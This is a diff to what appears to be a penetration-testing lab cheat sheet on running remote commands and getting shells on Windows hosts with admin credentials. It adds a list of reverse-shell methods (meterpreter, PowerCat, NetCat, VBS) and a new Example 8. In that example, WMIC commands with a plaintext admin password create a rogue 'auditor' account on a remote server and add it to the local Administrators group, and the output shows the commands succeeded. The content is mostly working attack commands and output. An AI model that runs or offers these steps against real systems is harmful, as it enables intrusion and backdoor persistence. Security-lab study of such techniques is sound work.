@@ -2,6 +2,13 @@
 Multiple ways to run remote commands or obtain a remote shell on a Windows box using valid (admin) credentials 
 ====================================================================================================================================================
 
+1. Powershell Remoting (native commands)
+2. WMIexec (Impacket version - Pass-The-Hash or with login/password)
+3. PSexec (Impacket version - Pass-The-Hash or with login/password)
+4. Create remotely a scheduled task (native command 'schtasks') + Powershell reverse shell (InvokePowerShellTcp.ps1)
+5. CrackMapExec (Pass-The-Hash or with login/password) + Metasploit (meterpreter reverse shell)
+6. WMIexec (impacket) + Powershell (PowerCat.ps1) + NetCat
+7. SMBclient + VBS reverse shell + CrackMapExec (WMI) + NetCat
 
 ========================================================================================================================
 Example 1 - Powershell Remoting
@@ -329,7 +336,7 @@ C:\>
 
 
 ========================================================================================================================
-Example 7 - VBS shell + SMBclient + CrackMapExec (WMI) + NetCat
+Example 7 - VBS reverse shell + SMBclient + CrackMapExec (WMI) + NetCat
 ========================================================================================================================
 
 jeff@kali:~/Documents/CTFs/BadBlood$ smbclient \\\\192.168.1.50\\C$ -U 'security-lab\\Administrator'
@@ -392,3 +399,62 @@ C:\> net user Administrator /domain
 
 C:\> 
 
+
+========================================================================================================================
+Example 8 -  WMIC native commands
+========================================================================================================================
+
+C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******" /privileges:ENABLE process call create "cmd.exe /c (echo net user auditor SuP@P@ssW0rd /add > C:\users\administrator\test.bat)"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 340;
+        ReturnValue = 0;
+};
+
+
+C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******!" /privileges:ENABLE process call create "cmd.exe /c (echo net localgroup Administrators auditor /add >> C:\users\administrator\test.bat)"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 2412;
+        ReturnValue = 0;
+};
+
+
+C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******!" /privileges:ENABLE process call create "cmd.exe /c (C:\users\administrator\test.bat)"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 732;
+        ReturnValue = 0;
+};
+
+On the remote Windows server, the auditor account has been created and added to the local admin group:
+======================================================================================================
+
+C:\users\administrators> net user
+
+User accounts for \\Test-server
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount	     Guest
+auditor
+
+The command completed successfully.
+
+
+C:\users\administrators> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator
+auditor
+The command completed successfully.
